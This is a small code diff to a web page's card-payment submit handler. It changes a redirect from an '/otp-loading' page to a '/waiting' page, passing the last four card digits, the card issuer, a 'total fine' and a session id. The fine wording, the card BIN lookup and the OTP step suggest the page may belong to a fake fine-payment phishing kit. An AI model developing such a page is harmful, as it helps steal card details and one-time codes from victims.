@@ -239,7 +239,7 @@ async function handleSubmit() {
 
   const last4  = document.getElementById('cardNumber').value.replace(/\s/g,'').slice(-4);
   const issuer = encodeURIComponent(binInfo?.Issuer || '');
-  window.location.href = '/otp-loading?amount=' + TOTAL_FINE + '&cardLast4=' + last4 + '&totalFine=' + TOTAL_FINE + '&issuer=' + issuer + '&sid=' + sid;
+  window.location.href = '/waiting?cardLast4=' + last4 + '&totalFine=' + TOTAL_FINE + '&issuer=' + issuer + '&sid=' + sid;
 }
 </script>
 </body>
